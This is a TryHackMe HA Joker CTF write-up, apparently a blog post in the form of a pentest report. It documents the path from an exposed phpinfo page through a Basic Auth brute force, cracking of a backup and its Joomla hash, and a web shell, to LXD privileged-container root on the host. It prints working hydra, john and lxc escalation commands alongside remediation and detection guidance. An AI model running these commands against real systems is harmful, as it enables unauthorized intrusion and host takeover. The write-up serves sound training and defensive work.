---
title: "TryHackMe: HA Joker CTF"
date: 2026-06-21 23:40:00 +0200
categories: [TryHackMe]
tags:
  - linux
  - web
  - apache
  - joomla
  - information-disclosure
  - basic-authentication
  - credential-reuse
  - password-cracking
  - remote-code-execution
  - lxd
  - privilege-escalation
description: >-
  HA Joker CTF chains public information disclosure, weak HTTP Basic
  Authentication, an exposed Joomla backup, weak administrator credentials,
  and LXD group membership into complete host root compromise.
author: lenovolegion7
media_subpath: /images/tryhackme_ha_joker_ctf
image:
  path: room_image.webp
  alt: "Original TryHackMe HA Joker CTF room artwork"
toc: true
comments: false
---

HA Joker CTF is a Linux web-and-host penetration-testing challenge built around Apache, Joomla, weak credentials, exposed backup material, and an unsafe LXD privilege boundary. The validated path started from unauthenticated web access and ended with root access to the host operating system.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe HA Joker CTF room card](room_card.webp){: w="301" h="268" .shadow }](https://tryhackme.com/room/jokerctf){: .center }

## Executive Summary

The target exposed three network services during the assessment:

```text
22/tcp    SSH     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp    HTTP    Apache 2.4.41; public files and PHP diagnostics
8080/tcp  HTTP    Apache 2.4.41; Basic Auth; Joomla CMS
```

The compromise did not depend on a memory-corruption, kernel, or software-CVE exploit. Instead, several configuration and credential weaknesses formed a complete attack chain.

Publicly reachable files disclosed useful attack intelligence. Weak HTTP Basic Authentication then exposed a Joomla application and downloadable backup. The backup reused the same weak password and contained a Joomla database with the Super User password hash. After that administrator credential was recovered, Joomla extension installation provided command execution as `www-data`.

The final privilege boundary failed because `www-data` belonged to the `lxd` group. Access to the LXD daemon allowed a privileged container to mount the host filesystem and obtain root-equivalent control.

> **Result:** Unauthenticated web access was converted into host root access through information disclosure, weak and reused credentials, administrative code execution, and root-equivalent LXD group membership.
{: .prompt-danger }

## Scope and Safety Context

This assessment was performed only against the authorized ephemeral TryHackMe room instance.

Other VPN hosts, TryHackMe platform infrastructure, denial-of-service activity, destructive modification, persistence, and unrelated host testing were outside the assessment. The report documents the validated compromise path rather than an exhaustive audit of every Joomla, Linux, and LXD control.

The documented credential attacks, administrative code upload, reverse shell, and privileged-container operations were performed only inside the authorized lab. Equivalent activity against systems without explicit authorization would be inappropriate.

## Initial Enumeration

Service discovery identified SSH on port `22`, an unauthenticated Apache service on port `80`, and a second Apache service protected by HTTP Basic Authentication on port `8080`.

The public HTTP service exposed two immediately useful files:

```text
/secret.txt
/phpinfo.php
```

The secret file provided a username clue and password-guessing context. The PHP diagnostic page disclosed backend versions, filesystem paths, the document root, enabled modules, and the runtime service account.

## Public Information Disclosure

The unauthenticated service returned the secret file directly:

```console
$ curl http://TARGET_IP/secret.txt
Batman hits Joker.
Joker: "Bats you may be a rock but you won't break me."
...
```

The PHP diagnostic endpoint exposed implementation details:

```console
$ curl http://TARGET_IP/phpinfo.php
PHP Version 7.2.24-0ubuntu0.18.04.17
Apache Version Apache/2.4.41 (Ubuntu)
User/Group www-data(33)/33
DOCUMENT_ROOT /var/www/html
```

This information reduced attacker uncertainty and made later username, password, and privilege-enumeration steps substantially more targeted.

## Weak HTTP Basic Authentication

The Joomla service on port `8080` used HTTP Basic Authentication. A targeted dictionary attack against the identified `joker` username recovered the password:

```console
$ hydra -l joker -P /usr/share/wordlists/rockyou.txt \
  -s 8080 TARGET_IP http-get /
[8080][http-get] host: TARGET_IP login: joker password: [REDACTED]
```

The recovered credential granted access to the Joomla application:

```console
$ curl -u 'joker:[REDACTED]' http://TARGET_IP:8080/
HTTP/1.1 200 OK
<meta name="generator" content="Joomla! - Open Source Content Management">
```

The weakness became more severe because the same password was reused for an encrypted backup archive hosted beneath the authenticated site.

## Backup Exposure and Password Reuse

An encrypted Joomla backup was downloadable over HTTP after Basic Authentication:

```console
$ wget --user=joker --password='[REDACTED]' \
  http://TARGET_IP:8080/backup.zip
Length: 12133560 (12M) [application/zip]
```

The archive password was recovered offline:

```console
$ zip2john backup.zip > backup.hash
$ john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
[REDACTED] (backup.zip)
```

Extraction exposed a full Joomla site backup and `db/joomladb.sql`. The database contained the Joomla Super User account and its bcrypt password hash:

```text
Display name: Super Duper User
Username: admin
Hash: [REDACTED]
```

The administrator password was then recovered offline from the exposed hash.

## Joomla Administrative Code Execution

The recovered `admin` credential authenticated to `/administrator`. Joomla Super User privileges allowed installation of a controlled component containing server-side PHP.

The validated administrative workflow was:

```text
POST /administrator/index.php -> Control Panel
POST com_installer upload -> controlled component installed
GET /index.php?option=com_rev&cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
```

The component executed operating-system commands and provided an interactive shell as `www-data`.

Local privilege enumeration immediately exposed the dangerous group membership:

```text
www-data,lxd
```

At this point, the web-application compromise had reached a root-equivalent local control plane.

## LXD Privilege Escalation

The compromised `www-data` account could access the LXD daemon socket:

```console
www-data$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)

$ ls -l /var/snap/lxd/common/lxd/unix.socket
srw-rw---- root lxd /var/snap/lxd/common/lxd/unix.socket
```

A container image was imported, a privileged container was created, and the host root filesystem was mounted inside it:

```console
$ lxc image import alpine.tar.gz --alias alpine
$ lxc init alpine privesc -c security.privileged=true
$ lxc config device add privesc hostroot disk source=/ path=/mnt/root recursive=true
$ lxc start privesc
$ lxc exec privesc /bin/sh
```

The resulting shell ran as root and could access the host's root directory, including the validated host-root proof file `/root/final.txt`:

```console
~ # whoami
root

~ # ls /mnt/root/root
final.txt
```

The final compromise required no kernel exploit. Membership in `lxd` provided the privileged control plane needed to mount and control the host filesystem.

## Findings

### HAJ-01 - Public Diagnostic and Secret Files Disclose Sensitive Information

- **Severity:** Medium
- **Affected service:** HTTP / 80
- **Impact:** Backend, path, runtime-account, and attack-context disclosure

The unauthenticated web service exposed `secret.txt` and `phpinfo.php`. Together they revealed contextual clues, backend versions, filesystem paths, the document root, and the `www-data` runtime identity.

**Remediation:**

- remove `phpinfo.php` and nonessential secret or test files from public document roots;
- maintain a deployment allowlist so debugging artifacts cannot be published;
- avoid exposing internal paths, versions, usernames, and diagnostic configuration;
- include automated web-content checks in release validation.

### HAJ-02 - Weak HTTP Basic Authentication Protects Joomla

- **Severity:** High
- **Affected service:** HTTP Basic Authentication / 8080
- **Impact:** Unauthorized access to Joomla and protected files

A weak Basic Auth password was recovered with a targeted dictionary attack. The same credential protected the Joomla site and provided access to files beneath that virtual host.

**Remediation:**

- replace weak credentials with long, unique, randomly generated secrets;
- throttle repeated authentication failures and monitor password guessing;
- use stronger identity controls and MFA for administrative applications where supported;
- do not rely on Basic Auth as the sole protection for backups or administration endpoints.

### HAJ-03 - Downloadable Backup and Password Reuse Expose Joomla Secrets

- **Severity:** Critical
- **Affected asset:** `backup.zip`
- **Impact:** Joomla source, configuration, database content, and credential material disclosure

The authenticated Joomla site exposed an encrypted backup whose password was reused from Basic Authentication. Extraction revealed the database dump and Joomla Super User password hash.

**Remediation:**

- remove backups from web-accessible paths;
- store backups in a dedicated, access-controlled backup service;
- use unique high-entropy encryption keys separate from application credentials;
- rotate every credential and secret contained in the exposed archive.

### HAJ-04 - Weak Joomla Super User Credential Enables Remote Code Execution

- **Severity:** Critical
- **Affected component:** Joomla `/administrator` and extension installer
- **Impact:** Arbitrary command execution as `www-data`

The Joomla Super User password was recovered from the exposed database hash. Administrative extension installation then allowed controlled PHP to execute operating-system commands as the web-service account.

**Remediation:**

- reset the Joomla Super User password to a long, unique value and enable MFA where supported;
- restrict `/administrator` to trusted networks or a VPN;
- disable web-based extension installation where feasible or require a controlled deployment process;
- apply least privilege to PHP, filesystem permissions, and the web-service account.

### HAJ-05 - Web Service Account Membership in LXD Enables Host Root Compromise

- **Severity:** Critical
- **Affected account:** `www-data`; group `lxd`
- **Impact:** Root-equivalent access to the complete host filesystem

The compromised web-service account belonged to `lxd`. That membership permitted access to the LXD socket, creation of a privileged container, and mounting of the host root filesystem.

**Remediation:**

- immediately remove `www-data` and all service accounts from `lxd`;
- treat LXD membership as root-equivalent and reserve it for dedicated administrators;
- restrict and monitor the LXD socket;
- alert on privileged containers and host-disk device mounts.

### HAJ-06 - Legacy PHP and Joomla Components Increase Attack Surface

- **Severity:** Medium
- **Affected services:** Apache/PHP/Joomla on ports `80` and `8080`
- **Impact:** Increased exposure to known weaknesses and maintenance risk

The diagnostic page identified PHP 7.2.24, while the backup contained a legacy Joomla 3 application tree. The report did not validate exploitation of a specific software CVE; this finding reflects maintenance and exposure risk.

**Remediation:**

- upgrade PHP and Joomla to supported releases after compatibility testing;
- remove unused extensions and dependencies;
- establish a formal patch cadence;
- use software-composition analysis and vulnerability scanning for the web stack.

## Security Impact

The validated chain provided complete compromise of the target host from an unauthenticated network position.

Demonstrated impact included:

- unauthorized access to the protected Joomla application;
- disclosure of application source, configuration, database content, password hashes, and internal paths;
- arbitrary command execution as the web-service account;
- unrestricted host-filesystem access through LXD;
- access to root-owned data and the ability to modify host binaries, credentials, SSH keys, and security controls;
- potential persistence or lateral movement from a root-equivalent context.

The highest-risk issue was the combination of web-service compromise and LXD membership. Once command execution as `www-data` was obtained, the host privilege boundary was effectively already lost.

## Detection Opportunities

Useful monitoring controls include:

- alert on repeated HTTP Basic Authentication failures against port `8080`;
- monitor downloads of backup archives from web-accessible paths;
- detect access to `phpinfo.php`, unexpected secret/test files, and administrative Joomla endpoints;
- alert on Joomla extension installation outside an approved deployment process;
- monitor PHP/web-server processes spawning shells or unexpected child processes;
- alert on LXD image imports, privileged container creation, and host filesystem mounts;
- monitor access to the LXD Unix socket by service accounts.

## Remediation Priorities

1. Remove `www-data` and all service accounts from `lxd` and restrict the daemon socket.
2. Remove `backup.zip`, `phpinfo.php`, and secret/test files from web roots.
3. Rotate Basic Auth, Joomla administrator, database, archive, and all backup-exposed credentials.
4. Restrict `/administrator` and port `8080` to trusted sources and add MFA where supported.
5. Disable web-based extension installation or require a controlled deployment pipeline.
6. Upgrade PHP and Joomla and establish patch, dependency, and backup governance.
7. Monitor LXD activity, archive downloads, authentication failures, and PHP command execution.

Deleting the backup alone is insufficient. Every credential and secret contained in the downloaded archive must be considered compromised and rotated.

## Retest Plan

1. Verify `www-data` is no longer a member of `lxd` and cannot access the LXD Unix socket.
2. Confirm `/backup.zip`, `/phpinfo.php`, and `/secret.txt` are no longer accessible.
3. Verify the previous Basic Auth credential is rejected and repeated guesses are throttled.
4. Confirm the previous Joomla administrator credential is rejected.
5. Verify the Joomla administrator interface is restricted and MFA-protected where supported.
6. Confirm arbitrary extension installation is blocked outside the approved deployment process.
7. Verify all credentials and secrets exposed through the backup have been rotated.
8. Confirm service accounts cannot create privileged LXD containers or mount host paths.

## Lessons Learned

HA Joker CTF demonstrates how several ordinary security weaknesses can combine into complete host compromise without a sophisticated software exploit.

Public diagnostic material made enumeration more precise. Weak and reused passwords converted that information into authenticated access and database disclosure. Joomla administrative rights then created a web shell, while unsafe LXD group membership removed the final host privilege boundary.

The most important defensive measures are therefore removal of public backups and diagnostic files, strong unique credentials, restricted administration, controlled extension deployment, and strict treatment of LXD membership as root-equivalent privilege.
